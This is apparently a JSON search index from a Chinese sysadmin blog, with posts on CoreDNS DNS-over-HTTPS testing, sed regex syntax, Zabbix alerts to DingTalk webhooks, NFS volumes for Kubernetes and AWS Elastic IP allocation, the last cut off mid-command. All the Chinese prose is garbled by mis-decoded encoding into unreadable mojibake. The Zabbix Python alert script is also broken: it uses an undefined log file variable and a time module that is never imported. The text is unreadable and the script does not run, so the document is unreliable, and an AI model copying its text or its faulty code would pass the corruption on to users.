.\rjsonçš„ç»“æœå¾ˆåä¸½ï¼Œä½†æ˜¯è¯·æ³¨æ„ï¼Œä¸Šé¢å®é™…å‘çš„æ˜¯dns-jsonï¼Œcorednsä¸æ”¯æŒï¼Œé¬¼ç•œå§ï¼\nDoHå®é™…æäº¤çš„æ˜¯dns-messageï¼š\ncurl -H 'accept: application/dns-message' -v 'https://dns.ddky.com/dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB' | hexdump\rcurl -H 'accept: application/dns-message' -v 'https://cloudflare-dns.com/dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB' | hexdump\ræ³¨æ„é‚£ä¸²dns=çš„å­—ç¬¦ä¸²ï¼Œé‚£æ˜¯ä¸ªå®é™…çš„æŸ¥è¯¢ï¼Œè¢«Base64åŠ ç äº†ï¼Œä½†ç»ä¸æ˜¯å¯¹ name=www.example.com\u0026amp;type=A è¿™æ ·ç®€å•çš„base64ï¼Œè¿™ä¸ªä¸œè¥¿å®Œå…¨æ— æ³•é€ å‡ºæ¥ï¼Œæœ‰äºŒè¿›åˆ¶çš„ä¸œè¥¿åœ¨é‡Œé¢ã€‚\næ‰€ä»¥æˆ‘ä»¬å¿…é¡»ç”¨ç¨‹åºæ¥äº†ï¼Œå¿…é¡»ä¸‹è½½ä¸€ä¸ªåœŸé€ çš„DoHçš„å®¢æˆ·ç«¯\nwget https://github.com/ameshkov/dnslookup/releases/download/v1.3.0/dnslookup-linux-amd64-v1.3.0.tar.gz\rè§£å‹å‡ºæ¥ä¸€ä¸ªdnslookupï¼Œç”¨è¿™ä¸ªæ¥æŸ¥æ‰è¡Œ\n./dnslookup www.ddky.com https://dns.ddky.com/dns-query\r./dnslookup www.ddky.com https://dns.alidns.com/dns-query\rè¿™æ ·å°±okäº†ï¼Œæœ€åè¡¥å……ä¸€ä¸‹ï¼Œå¦‚æœä½ éè¦ç”¨curlåšDoHï¼Œä¹Ÿè¡Œï¼Œå¾—ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„curl\ncurl -v --doh-url https://cloudflare-dns.com/dns-query https://m.ddky.com\rçœ‹è¿‡ç¨‹ï¼Œæ˜¯å…ˆå»CFæŸ¥äº†DNSï¼Œç„¶ååˆå‘äº†ä¸ªè¯·æ±‚åˆ°m.ddky.com\n","date":"2022-12-07","img":"","permalink":"https://rendoumi.com/posts/20221207-cordns_dnsmasq/","series":null,"tags":null,"title":"CoreDNSæ›¿ä»£dnsmasq"},{"categories":null,"content":"ä¹‹å‰è¯´è¿‡sedçš„é«˜é˜¶ç”¨æ³•ï¼Œå…¶å®æ™®é€šæƒ…å†µä¸‹ï¼Œæ­£åˆ™æ˜¯æœ€å¸¸ç”¨çš„ï¼Œä¸‹é¢å°±æ¥è¯´ä¸€ä¸‹ï¼Œç”¨ä¸åˆ°çš„å°±æš‚æ—¶ä¸è¯´\n1^ # åŒ¹é…è¡Œå¼€å§‹ï¼Œå¦‚ï¼š/^sed/åŒ¹é…æ‰€æœ‰ä»¥sedå¼€å¤´çš„è¡Œã€‚ 2$ # åŒ¹é…è¡Œç»“æŸï¼Œå¦‚ï¼š/sed$/åŒ¹é…æ‰€æœ‰ä»¥sedç»“å°¾çš„è¡Œã€‚ 3. # åŒ¹é…ä¸€ä¸ªéæ¢è¡Œç¬¦çš„ä»»æ„å­—ç¬¦ï¼Œå¦‚ï¼š/s.d/åŒ¹é…såæ¥ä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œæœ€åæ˜¯dã€‚ 4* # åŒ¹é…0ä¸ªæˆ–å¤šæ¬¡å­—ç¬¦ï¼Œå¦‚ï¼š/a*sed/åŒ¹é…æ‰€æœ‰æ¨¡æ¿æ˜¯0ä¸ªæˆ–å¤šä¸ªaåç´§è·Ÿsedçš„è¡Œã€‚åç´§è·Ÿsedçš„è¡Œã€‚ 5\\? # åŒ¹é…0æ¬¡æˆ–1æ¬¡ä»–å‰é¢çš„å­—ç¬¦ 6\\+ # åŒ¹é…1æ¬¡æˆ–å¤šæ¬¡ä»–å‰é¢çš„å­—ç¬¦ï¼Œå¦‚ï¼šç©ºæ ¼\\+ æˆ– â€œ\\+â€œåŒ¹é…è‡³å°‘ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼ 7| #ç®¡é“ç¬¦å·ç”¨æ¥åŒ¹é…ä¸¤è¾¹ä»»æ„ä¸€ä¸ªå­è¡¨è¾¾å¼ï¼Œå¦‚ï¼š\u0026#39;/101\\|102/p\u0026#39; åŒ¹é…åŒ…å«101æˆ–è€…102çš„è¡Œæ‰“å° 8[] # åŒ¹é…ä¸€ä¸ªæŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚/[sS]ed/åŒ¹é…sedå’ŒSedã€‚ 9[^] # åŒ¹é…ä¸€ä¸ªä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚ï¼š/[^A-RT-Z]ed/åŒ¹é…ä¸åŒ…å«A-Rå’ŒT-Zçš„ä¸€ä¸ªå­—æ¯å¼€å¤´ï¼Œç´§è·Ÿedçš„è¡Œã€‚ 10\\(..\\) # åŒ¹é…å­ä¸²ï¼Œä¿å­˜åŒ¹é…çš„å­—ç¬¦ï¼Œå¦‚s/\\(love\\)able/\\1rsï¼Œloveableè¢«æ›¿æ¢æˆloversã€‚ 11\u0026amp; # ä¿å­˜æœç´¢å­—ç¬¦ç”¨æ¥æ›¿æ¢å…¶ä»–å­—ç¬¦ï¼Œå¦‚s/love/ **\u0026amp;** /ï¼Œloveè¿™æˆ **love** ã€‚ 12\\\u0026lt; # åŒ¹é…å•è¯çš„å¼€å§‹ï¼Œå¦‚:/\\\u0026lt;love/åŒ¹é…åŒ…å«ä»¥loveå¼€å¤´çš„å•è¯çš„è¡Œã€‚ 13\\\u0026gt; # åŒ¹é…å•è¯çš„ç»“æŸï¼Œå¦‚/love\\\u0026gt;/åŒ¹é…åŒ…å«ä»¥loveç»“å°¾çš„å•è¯çš„è¡Œã€‚ 14\\{m\\} # é‡å¤å­—ç¬¦xï¼Œmæ¬¡ï¼Œå¦‚ï¼š/0\\{5\\}/åŒ¹é…åŒ…å«5ä¸ª0çš„è¡Œã€‚ 15\\{m,\\} # é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œå¦‚ï¼š/0\\{5,\\}/åŒ¹é…è‡³å°‘æœ‰5ä¸ª0çš„è¡Œã€‚ 16\\{m,n\\} # é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œä¸å¤šäºnæ¬¡ï¼Œå¦‚ï¼š/0\\{5,10\\}/åŒ¹é…5~10ä¸ª0çš„è¡Œã€‚ ä¾‹å­å¾ˆå¤š:\nç”¨æˆ·åï¼Œåé¢è·Ÿ1ä¸ªæˆ–è€…å¤šä¸ªç©ºæ ¼ï¼Œå†è·Ÿå¯†ç ï¼›æ›´æ¢æˆç”¨æˆ·å å¯†ç  MACåœ°å€\n1sed -i \u0026#34;s/${username} \\+${password}$/${username} ${password} ${IV_HWADDR}/\u0026#34; ${PASSFILE} è·Ÿ shell è„šæœ¬çš„å‚æ•°ä¸€èµ·è®°æ¯”è¾ƒå¥½ï¼š\n1$0 è„šæœ¬æœ¬èº«çš„åå­— 2$1 ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬1ä¸ªå‚æ•° 3$2 ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬2ä¸ªå‚æ•° 4$@ ä¼ ç»™è„šæœ¬çš„æ‰€æœ‰å‚æ•°çš„åˆ—è¡¨ 5$# ä¼ ç»™è„šæœ¬çš„å‚æ•°ä¸ªæ•° 6$* ä»¥ä¸€ä¸ªå•å­—ç¬¦ä¸²æ˜¾ç¤ºæ‰€æœ‰å‘è„šæœ¬ä¼ é€’çš„å‚æ•°ï¼Œä¸ä½ç½®å˜é‡ä¸åŒï¼Œ\u0026gt;å‚æ•°å¯è¶…è¿‡9ä¸ª 7$$ è„šæœ¬è¿è¡Œçš„å½“å‰è¿›ç¨‹IDå· 8$? å‘½ä»¤æ‰§è¡Œç»“æœåé¦ˆï¼Œ0è¡¨ç¤ºæ‰§è¡ŒæˆåŠŸï¼Œå…¶ä½™æ•°å­—è¡¨ç¤ºæ‰§è¡Œä¸æˆåŠŸã€‚ è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„åœ°æ–¹ï¼Œsed ä½¿ç”¨ -i å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹æ—¶ï¼Œæ‰§è¡Œè€…éœ€è¦æœ‰å¯¹æ–‡ä»¶ç›®å½•çš„å†™æƒé™ï¼Œå› ä¸ºsedå®é™…æ˜¯äº§ç”Ÿäº†ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œç„¶åå†æŒªå›å»å¾—ï¼ï¼ï¼ï¼\n","date":"2022-12-07","img":"","permalink":"https://rendoumi.com/posts/20221207-sed_regex/","series":null,"tags":null,"title":"Sedä¸­çš„æ­£åˆ™è¡¨è¾¾å¼ç”¨æ³•"},{"categories":null,"content":"zabbix æ˜¯å¾ˆç†Ÿæ‚‰çš„ä¸œè¥¿ï¼Œä½†æ˜¯å®é™…ä¸Šåšä¸»å·²ç»è·³è¿‡äº†è¿™ä¸ªä¸œè¥¿ï¼Œç›´æ¥è¹¦åˆ° Prometheus å»äº†\nä½†æ˜¯ï¼Œå­˜åœ¨å³åˆç†ï¼Œå½“ä¸‹å…¬å¸ç”¨çš„æ˜¯è¿™ä¸ªï¼Œé‚£ä¹ˆç”¨å°±ç”¨å§ï¼Œzabbixå‘åˆ°é’‰é’‰å‘Šè­¦ã€‚\né‚£ä¹ˆæˆ‘ä»¬ä¹Ÿç ”ç©¶ä¸€ä¸‹å¦‚ä½•å‘åˆ°é’‰é’‰å‘Šè­¦ï¼Œè€Œä¸”å¥½çœ‹ä¸€äº›\nåŸç†ï¼š\nåŸç†å°±æ˜¯ç”¨ post å‘é’‰é’‰æœºå™¨äººçš„ webhook åœ°å€æäº¤ Markdown çš„ json ä¿¡æ¯\né¦–å…ˆæˆ‘ä»¬è¦å»ºç«‹ä¸ªé’‰é’‰ç¾¤ï¼Œç„¶ååœ¨ç¾¤ä¸­æ·»åŠ ä¸€ä¸ªç¾¤æœºå™¨äººï¼Œè¿™é‡Œå°±ä¼šæœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯è¿™ä¸ªæœºå™¨äººåªæ¥å—ç‰¹å®šçš„è¯è¯­ï¼ŒäºŒæ˜¯å‘æœºå™¨äººå‘é€æ¶ˆæ¯çš„æœºå™¨çš„ipæ˜¯å›ºå®šçš„ã€‚\né˜¿é‡Œäº‘å»ºè®®çš„æ˜¯å…³é”®è¯ï¼šäº‘ç›‘æ§ã€äº‘æœåŠ¡ã€ç›‘æ§ã€Monitorã€ECSã€æŠ¥è­¦\nå½“ç„¶ï¼Œè¿™é‡Œæ›´åŠ å»ºè®®IPï¼ŒIPæ˜¯æ­»çš„ï¼ŒæŠ¥è­¦é‡Œå¸¦å…³é”®è¯æ„å‘³ç€å‘é€å†…å®¹è¢«éƒ¨åˆ†å›ºå®šäº†ã€‚\nå¦‚ä¸Šï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªé’‰é’‰æœºå™¨äººçš„Webhookåœ°å€ï¼š\n1https://oapi.dingtalk.com/robot/send?access_token=xxxxxxxxxx ç„¶åæˆ‘ä»¬è¦å‡†å¤‡ä¸€ä¸ªå‘é€çš„è„šæœ¬ï¼Œpythonå¾ˆåˆé€‚\n1#!/usr/bin/env python 2#coding:utf-8 3 4#zabbixé’‰é’‰æŠ¥è­¦ 5import requests,json,sys,os,datetime 6#è¯´æ˜ï¼šè¿™é‡Œæ”¹ä¸ºè‡ªå·±åˆ›å»ºçš„æœºå™¨äººçš„webhook 7webhook=\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=xxxxxx\u0026#34; 8 9def log(info): 10 if os.path.isfile(\u0026#34;/tmp/dingding.log\u0026#34;) == False: 11 f = open(log_file, \u0026#39;a+\u0026#39;) 12 else: 13 f = open(log_file,\u0026#39;w+\u0026#39;) 14 f.write(info) 15 f.close() 16 17def msg(text,user): 18 json_text= { 19 \u0026#34;msgtype\u0026#34;: \u0026#34;markdown\u0026#34;, 20 \u0026#34;markdown\u0026#34;: { 21 \u0026#34;title\u0026#34;: \u0026#34;zabbix monitor\u0026#34;, 22 \u0026#34;text\u0026#34;: text 23 }, 24 \u0026#34;at\u0026#34;: { 25 \u0026#34;atMobiles\u0026#34;: [ 26 user 27 ], 28 \u0026#34;isAtAll\u0026#34;: False 29 } 30 } 31 32 headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} 33 r=requests.post(url=webhook,data=json.dumps(json_text),headers=headers).json() 34 code = r[\u0026#34;errcode\u0026#34;] 35 time=time.strftime(\u0026#34;%Y-%m-%d %H:%M:%S\u0026#34;, time.localtime()) 36 if code == 0: 37 log(time + \u0026#34;:æ¶ˆæ¯å‘é€æˆåŠŸ è¿”å›ç :\u0026#34; + str(code) + \u0026#34;\\n\u0026#34;) 38 else: 39 log(time + \u0026#34;:æ¶ˆæ¯å‘é€å¤±è´¥ è¿”å›ç :\u0026#34; + str(code) + \u0026#34;\\n\u0026#34;) 40 exit(3) 41 42if __name__ == \u0026#39;__main__\u0026#39;: 43 user = sys.argv[1] #ç”¨æˆ· 44 subject = sys.argv[2] #æ ‡é¢˜ 45 text = sys.argv[3] #æ¶ˆæ¯ 46 msg(text,user) æˆ‘ä»¬æŠŠä¸Šé¢çš„æ–‡ä»¶å†…å®¹æ”¾åˆ° /usr/lib/zabbix/alertscripts ç›®å½•ä¸‹ï¼Œåå­—å°±å«åš dingding.py ï¼Œåªèƒ½æ˜¯è¿™ä¸ªç›®å½•ï¼Œå› ä¸ºè¿™æ˜¯ zabbix ç¼ºçœå¤–æŒ‚è„šæœ¬æ–‡ä»¶çš„ç›®å½•ã€‚\nä»ä¸Šé¢ä»£ç é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå®é™…æ˜¯å‘é€äº†ä¸€ä¸ª markdown çš„æ–‡æœ¬ï¼Œé‚£ä¹ˆè‡ªç„¶ï¼Œå„ç§markdownçš„è¯­æ³•å°±å¯ä»¥ç”¨èµ·æ¥äº†ï¼Œä»”ç»†çœ‹ä¸€ä¸‹é’‰é’‰markdownå‚æ•°çš„è¯¦è§£ï¼š\nå¯ä»¥æ ¹æ®è‡ªå·±éœ€æ±‚æ¥ä¿®æ”¹ã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬é…ç½®Zabbixçš„å‘Šè­¦é…ç½®\nåˆ›å»ºæ–°çš„å‘Šè­¦åª’ä»‹ï¼šåª’ä»‹ç±»å‹é€‰æ‹©è„šæœ¬ï¼Œæå‰å°†ä¸Šæ–¹çš„è„šæœ¬æ”¾ç½®äº/usr/lib/zabbix/alertscriptsä¸­å¹¶åœ¨è„šæœ¬åç§°å¤„å¡«å†™ä½ å‘½åçš„æ–‡ä»¶åã€‚ æ·»åŠ å‘Šè­¦å‚æ•°ï¼šè¿™é‡Œç”¨åˆ°äº†3ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯{ALERT.SENDTO}å‘Šè­¦å¯¹è±¡ï¼Œç¬¬äºŒä¸ªæ˜¯{ALERT.SUBJECT}å‘Šè­¦å¯¹è±¡ï¼Œç¬¬ä¸‰ä¸ªæ˜¯{ALERT.MESSAGE}å‘Šè­¦æ­£æ–‡ï¼ŒæŒ‰ç…§å¡«å†™å³å¯ã€‚\nALERT.SENDTO}\n#å¯¹åº”Pythonè„šæœ¬ä¸­çš„ï¼Œuser=sys.argv1 ã€‚\n{ALERT.SUBJECT}\n#å‘é€çš„ä¿¡æ¯çš„æ ‡é¢˜\n{ALERT.MESSAGE}\n#å¯¹åº”Pythonè„šæœ¬ä¸­çš„ï¼Œtext=sys.argv3 ã€‚\nå¢åŠ Message typeï¼šä¸€èˆ¬å¢åŠ 3ä¸ªå°±è¶³å¤Ÿäº†ï¼Œå‘ç°é—®é¢˜ã€é—®é¢˜æ¢å¤ã€é—®é¢˜æ›´æ–°ï¼Œè¯¦ç»†çš„è®¾ç½®åœ¨ä¸‹æ–¹è¯´æ˜ã€‚\nè¿™é‡Œå°±æ˜¯å…³é”®äº†ï¼š\nå‘ç°é—®é¢˜çš„æ¨¡æ¿ï¼š\n1![å‘Šè­¦å¹³å°ä¿¡æ¯](http://www.rendoumi.com/fire.png) 2\u0026gt; * ##### å‘Šè­¦ä¸»æœº: {HOSTNAME1} 3\u0026gt; * ##### å‘Šè­¦æ—¶é—´: {EVENT.DATE} {EVENT.TIME} 4\u0026gt; * ##### å‘Šè­¦ç­‰çº§: {TRIGGER.SEVERITY} 5\u0026gt; * ##### å‘Šè­¦ä¿¡æ¯: {TRIGGER.NAME} 6\u0026gt; * ##### å‘Šè­¦é¡¹ç›®: {TRIGGER.KEY1} 7\u0026gt; * ##### é—®é¢˜è¯¦æƒ…: {ITEM.NAME}:{ITEM.VALUE} 8\u0026gt; * ##### å½“å‰çŠ¶æ€: {TRIGGER.STATUS}:{ITEM.VALUE1} 9\u0026gt; * ##### äº‹ä»¶ID: {EVENT.ID} Problem recovery(é—®é¢˜æ¢å¤)çš„æ¨¡æ¿ï¼š\n1![å‘Šè­¦å¹³å°ä¿¡æ¯](http://www.rendoumi.com/recover.png) 2\u0026gt; * #### è­¦å‘Šè§£é™¤ï¼š{EVENT.RECOVERY.DATE} {EVENT.RECOVERY.TIME} 3\u0026gt; * ##### å‘Šè­¦æŒç»­æ—¶é•¿: {EVENT.DURATION} 4\u0026gt; * ##### å‘Šè­¦ä¸»æœº: {HOST.NAME} 5\u0026gt; * ##### å‘Šè­¦ä¿¡æ¯: {EVENT.NAME} 6\u0026gt; * ##### å‘Šè­¦ç­‰çº§: {EVENT.SEVERITY} 7\u0026gt; * ##### äº‹ä»¶ID: {EVENT.ID} 8\u0026gt; * ##### {TRIGGER.URL} æœ‰è¿™ä¸¤ä¸ªå°±å¤Ÿäº†\nåˆ›å»ºåŠ¨ä½œï¼ˆç‚¹å‡»å·¦è¾¹èœå•çš„é…ç½®\u0026mdash;\u0026gt;åŠ¨ä½œï¼‰\næ·»åŠ å‘Šè­¦æ¡ä»¶\næ·»åŠ  è§¦å‘å™¨ç¤ºè­¦åº¦ å¤§äºç­‰äº è­¦å‘Š\næ“ä½œï¼Œé€‰æ‹©å‘é€ç»™Adminç»„ï¼Œæˆ–è€…å…¶ä»–ç»„ã€‚\nåœ¨æ“ä½œç»†èŠ‚é‡Œï¼Œæˆ‘ä»¬å‘é€å‘Šè­¦åˆ°Adminç»„ï¼Œç„¶åæ–¹å¼é€‰dingdingï¼Œè¿™æ ·å°±è·ŸæŠ¥è­¦åª’ä»‹è”ç³»èµ·æ¥äº†ã€‚\nè¿™æ ·ä¸€è½®è½®çš„æ›´æ–°ä»¥åï¼Œå°±å¯ä»¥ä½¿ç”¨äº†ã€‚æ³¨æ„è¦ç ”ç©¶Markdownçš„è¯­æ³•ã€‚å¦å¤–æå‰å‡†å¤‡å¥½å›¾ç‰‡ã€‚\næˆ‘ä»¬å°±å¾—åˆ°ä¸€ä¸ªè·Ÿé˜¿é‡Œäº‘å‘Šè­¦ä¸€æ‘¸ä¸€æ ·çš„ä¸œè¥¿äº†ï¼Œè¯´å®è¯ï¼Œå¥½çœ‹ï¼Œæ²¡æœ‰é¸Ÿç”¨ã€‚\n","date":"2022-11-30","img":"","permalink":"https://rendoumi.com/posts/20221130-zabbix_dingding/","series":null,"tags":null,"title":"Zabbixä¸‹å‘å¾€é’‰é’‰å‘Šè­¦"},{"categories":null,"content":"ç”¨NFSæ¥åškubernetesçš„æŒä¹…åŒ–å·è™½ç„¶ä¸æ˜¯æœ€ä½³å®è·µï¼Œä½†å­˜åœ¨å³åˆç†ã€‚åœ¨ç°åœ¨çš„å…¬å¸å°±æ˜¯è¿™ä¹ˆç”¨çš„ï¼Œè®°å½•ä¸€ä¸‹ï¼Œå¯ç”¨ä½†ä¸æ˜¯æœ€ä½³ã€‚\nä¸€ã€æ­å»ºNFSæœåŠ¡ç«¯å’Œæ‰€æœ‰å·¥ä½œèŠ‚ç‚¹å®‰è£…å®¢æˆ·ç«¯ 1#NFSæœåŠ¡ç«¯ (centos7) 2yum install nfs-utils rpcbind -y 3 4mkdir -p /data/nfs/{download,bakup,www} 5echo \u0026#34;/data/nfs 10.10.0.0/16(rw,all_squash,insecure,sync)\u0026#34; \u0026gt;\u0026gt; /etc/exports 6exportfs -r 7 8systemctl enable rpcbind nfs-server 9systemctl restart rpcbind nfs-server 10 11showmount -e localhost 12 13#å®¢æˆ·ç«¯æ ¹æœ¬ä¸è£…ä¹Ÿå¯ä»¥ï¼Œå®¢æˆ·ç«¯ä¸éœ€è¦å¯åŠ¨ä»»ä½•nfsæœåŠ¡ 14#åªæ˜¯ä¸ºäº†ä½¿ç”¨showmountå·¥å…·æ¥éªŒè¯ 15 16#NFSå®¢æˆ·ç«¯ï¼ˆCentOSï¼Œæ‰€æœ‰WorkNodeèŠ‚ç‚¹éƒ½éœ€è¦æ‰§è¡Œï¼‰ 17yum install -y nfs-utils 18 19#NFSå®¢æˆ·ç«¯ï¼ˆUbuntuï¼Œæ‰€æœ‰WorkNodeèŠ‚ç‚¹éƒ½éœ€è¦æ‰§è¡Œï¼‰ 20apt install -y nfs-common NFS æœåŠ¡ç«¯çš„å‚æ•°å¦‚ä¸‹ï¼š\nrw èƒ½è¯»èƒ½å†™ insecure NFSé€šè¿‡1024ä»¥ä¸Šçš„ç«¯å£å‘é€ root_squash rootä¼šè¢«å˜æˆnobobyï¼Œå…¶ä»–äººä¸å˜ no_root_squash rootèº«ä»½ä¿æŒä¸å˜ï¼Œå…¶ä»–äººä¸å˜ã€‚ï¼ˆä¸èƒ½ç”¨è¿™ä¸ªï¼Œå®¹æ˜“è¢«é»‘ï¼‰ all_squash ä¸è®ºç™»å…¥NFSçš„ä½¿ç”¨è€…èº«ä»½ä¸ºä½•ï¼Œä»–çš„èº«ä»½éƒ½ä¼šè¢«å‹ç¼©æˆä¸ºåŒ¿åä½¿ç”¨è€…ï¼Œé€šå¸¸ä¹Ÿå°±æ˜¯nobody sync æ•°æ®ç›´æ¥è½ç›˜ï¼Œæ€§èƒ½ç•¥æŸã€‚ async æ•°æ®å…ˆè½å†…å­˜ï¼Œç„¶åè½ç›˜ï¼Œæ€§èƒ½ç•¥å‡ã€‚ ç»¼ä¸Šï¼Œä¿é™©çš„å‚æ•°å°±æ˜¯\n1/data/nfs 10.10.0.0/16(rw,insecure,all_squash,sync) æ³¨æ„ï¼šä¿®æ”¹äº†/etc/exportsåï¼Œå¹¶ä¸éœ€è¦é‡å¯nfsæœåŠ¡ï¼Œåªè¦ç”¨exportfsé‡æ–°æ‰«æä¸€æ¬¡/etc/exportsï¼Œå¹¶ä¸”é‡æ–°åŠ è½½å³å¯\n1exports -rv äºŒã€PODå†…ç›´æ¥ä½¿ç”¨ ç”±äºnfsæ˜¯å†…æ ¸è‡ªå¸¦çš„ä¸œè¥¿ï¼Œæ‰€ä»¥æœ€ç®€å•çš„ä½¿ç”¨æ–¹æ³•å°±æ˜¯ç›´æ¥åœ¨podå†…ä½¿ç”¨\n1apiVersion: v1 2kind: Pod 3metadata: 4 name: test 5 labels: 6 app.kubernetes.io/name: alpine 7spec: 8 containers: 9 - name: alpine 10 image: alpine:latest 11 command: 12 - touch 13 - /data/test 14 volumeMounts: 15 - name: nfs-volume 16 mountPath: /data 17 volumes: 18 - name: nfs-volume 19 nfs: 20 server: 10.10.247.38 21 path: /data 22 readOnly: no è¿™ä¸ªpodæ˜¯ä¸€æ¬¡æ€§è¿è¡Œçš„ï¼Œè¿è¡Œå®Œåå°±å¯ä»¥çœ‹åˆ°nfsä¸­å¤šäº†ä¸ªtestæ–‡ä»¶\nä¸‰ã€ç”¨PVå’ŒPVCä½¿ç”¨ å…ˆå»ºç«‹PVï¼Œæ³¨æ„ç­–ç•¥æ˜¯Retainï¼Œä¸ä¼šä¸¢æ•°æ®ã€‚å¦‚æœæ˜¯Recycleä¼šæ¸…æ´—æ•°æ®\n1apiVersion: v1 2kind: PersistentVolume 3metadata: 4 name: nfs-pv-pvname 5spec: 6 accessModes: 7 - ReadWriteOnce 8 - ReadOnlyMany 9 - ReadWriteMany 10 capacity: 11 storage: 10Gi 12 storageClassName: \u0026#34;\u0026#34; 13 persistentVolumeReclaimPolicy: Retain 14 volumeMode: Filesystem 15 nfs: 16 server: 10.10.247.38 17 path: /data 18 readOnly: no ç„¶åå»ºç«‹ PVC\n1apiVersion: v1 2kind: PersistentVolumeClaim 3metadata: 4 name: nfs-pvc-pvcname 5spec: 6 accessModes: 7 - ReadWriteMany 8 resources: 9 requests: 10 storage: 1Gi å»ºä¸€ä¸ªDeploymentï¼Œç”¨ä¸€ä¸‹\n1apiVersion: extensions/v1beta1 2kind: Deployment 3metadata: 4 name: nfs-pvc 5spec: 6 replicas: 1 7 template: 8 metadata: 9 labels: 10 app: nfs-pvc 11 spec: 12 containers: 13 - name: nginx 14 image: alphine/nginx:latest 15 imagePullPolicy: IfNotPresent 16 ports: 17 - containerPort: 80 18 name: web 19 #ä½¿ç”¨volume 20 volumeMounts: 21 - name: www 22 subPath: nginx-pvc #è¿œç¨‹å­è·¯å¾„ 23 mountPath: /usr/share/nginx/html 24 volumes: 25 - name: www 26 persistentVolumeClaim: 27 claimName: nfs-pvc-pvcname æ³¨æ„ï¼š\nStorage 10Gi 1Gi è¿™éƒ½æ˜¯éª—é¬¼ç©å„¿å‘¢ï¼Œæ ¹æœ¬ä¸èµ·ä»»ä½•ä½œç”¨ï¼ï¼ï¼ ","date":"2022-11-24","img":"","permalink":"https://rendoumi.com/posts/20221124-k8s_nfs/","series":null,"tags":null,"title":"Kubernetesä½¿ç”¨nfsåšæŒä¹…åŒ–å·å­˜å‚¨"},{"categories":null,"content":" 1#!/usr/bin/env python 2#coding:utf-8 3 4#zabbixé’‰é’‰æŠ¥è­¦ 5import requests 6import json 7import sys 8import os 9import datetime 10 11#è¿™é‡Œæ˜¯è‡ªå·±åˆ›å»ºçš„æœºå™¨äººçš„webhook 12webhook=\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=xxxxxx\u0026#34; 13 14user=sys.argv[1] 15text=sys.argv[3] 16data={ 17 \u0026#34;msgtype\u0026#34;: \u0026#34;text\u0026#34;, 18 \u0026#34;text\u0026#34;: { 19 \u0026#34;content\u0026#34;: text 20 }, 21 \u0026#34;at\u0026#34;: { 22 \u0026#34;atMobiles\u0026#34;: [ 23 user 24 ], 25 \u0026#34;isAtAll\u0026#34;: False 26 } 27} 28headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} 29x=requests.post(url=webhook,data=json.dumps(data),headers=headers) ä¸‹é¢æ”¾shellè„šæœ¬çš„\n1#!/bin/bash 2 3function ddmsg() { 4 Token=\u0026#34;xxxxxxxxxxxx\u0026#34; 5 Weburl=\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=\u0026#34; 6 curl -ks -m 2 \u0026#34;${Weburl}${Token}\u0026#34; \\ 7 -H \u0026#39;Content-Type: application/json;charset=utf-8\u0026#39; \\ 8 -d \u0026#34;{\u0026#39;msgtype\u0026#39;: \u0026#39;text\u0026#39;, 9 \u0026#39;text\u0026#39;: { \u0026#39;content\u0026#39;: \u0026#39;$*\u0026#39;} 10 }\u0026#34; \u0026amp;\u0026gt;/tmp/ddmsg.log 11 if [ `grep \u0026#34;errmsg.*ok\u0026#34; /tmp/ddmsg.log |wc -l` -ne 1 ]; then 12 echo \u0026#39;send error !\u0026#39;;cat /tmp/ddmsg.log;exit 1; 13 fi 14} 15 16#æµ‹è¯•å†…å®¹ 17echo \u0026#34;@è­¦æŠ¥ 18ä¸»æœº:$(hostname) 19ä¿¡æ¯:Node test 20æ—¶é—´:$(date +\u0026#34;%F %T\u0026#34;) 21\u0026#34;\u0026gt;.msg 22 23cat .msg 24ddmsg \u0026#34;`cat .msg`\u0026#34; ","date":"2022-11-23","img":"","permalink":"https://rendoumi.com/posts/20221123-dingding/","series":null,"tags":null,"title":"é’‰é’‰å‘Šè­¦å‘é€"},{"categories":null,"content":"å®¢æˆ·å‘äº†ä¸€ä¸ªéœ€æ±‚å¦‚ä¸‹ï¼š\n1ç”¨shell æˆ–è€…python3 æ§åˆ¶awså»è·å–æ–°IPã€ç»‘å®šIPåˆ°å®ä¾‹ è¿™ä¸ªå°±éå¸¸ç®€å•äº†ï¼Œå› ä¸ºæœ¬èº«awså°±æä¾›pythonçš„å·¥å…·ï¼Œä¸€åˆ‡éƒ½å¯ä»¥apiåŒ–çš„\nåšæ³•å¦‚ä¸‹ï¼š\n1#å®‰è£…awsçš„å·¥å…· 2cd /tmp 3curl -kL \u0026#34;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\u0026#34; -o \u0026#34;awscliv2.zip\u0026#34; 4unzip awscliv2.zip 5sudo ./aws/install 6aws --version 7 8#é…ç½®aws key 9aws configure 10 11#æŸ¥çœ‹é…ç½® 12aws configure list 13 14---------------------------- 15 16#ç”³è¯·ä¸€ä¸ªæ–°IPå¹¶ä¸”æ‰“tag 17aws ec2 allocate-address --region $Region |tee /tmp/eip.log 18eip_id=$(jq -r \u0026#34;.AllocationId\u0026#34; /tmp/eip.log) 19aws ec2 create-tags --resources ${eip_id} --tags Key=Name,Value=eip-01 20 21eip=$(jq -r 